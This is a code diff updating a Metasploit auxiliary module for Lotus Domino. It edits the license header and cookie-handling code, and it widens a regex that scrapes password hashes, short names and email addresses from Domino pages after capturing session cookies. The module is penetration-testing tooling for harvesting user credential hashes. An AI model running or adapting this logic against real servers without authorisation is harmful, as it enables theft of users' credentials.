@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -61,7 +59,7 @@ class Metasploit3 < Msf::Auxiliary
 
         else
           print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized #{res.code} response")
-          print_error(res.inspect)
+          print_error(res.to_s)
           return :abort
 
         end
@@ -95,10 +93,10 @@ class Metasploit3 < Msf::Auxiliary
         return
       end
 
-      if (res and res.code == 302 )
-        if res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/DomAuthSessId=(.*);(.*)/i)
+      if res and res.code == 302
+        if res.get_cookies.match(/DomAuthSessId=(.*);(.*)/i)
           cookie = "DomAuthSessId=#{$1}"
-        elsif res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/LtpaToken=(.*);(.*)/i)
+        elsif res.get_cookies.match(/LtpaToken=(.*);(.*)/i)
           cookie = "LtpaToken=#{$1}"
         else
           print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized 302 response")
@@ -164,7 +162,7 @@ class Metasploit3 < Msf::Auxiliary
       if (res and res.body)
         short_name = res.body.scan(/<INPUT NAME=\"ShortName\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
         user_mail = res.body.scan(/<INPUT NAME=\"InternetAddress\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
-        pass_hash = res.body.scan(/<INPUT NAME=\"dspHTTPPassword\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
+        pass_hash = res.body.scan(/<INPUT NAME=\"\$?dspHTTPPassword\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
 
         if short_name.to_s.strip.empty?
           short_name = 'NULL'
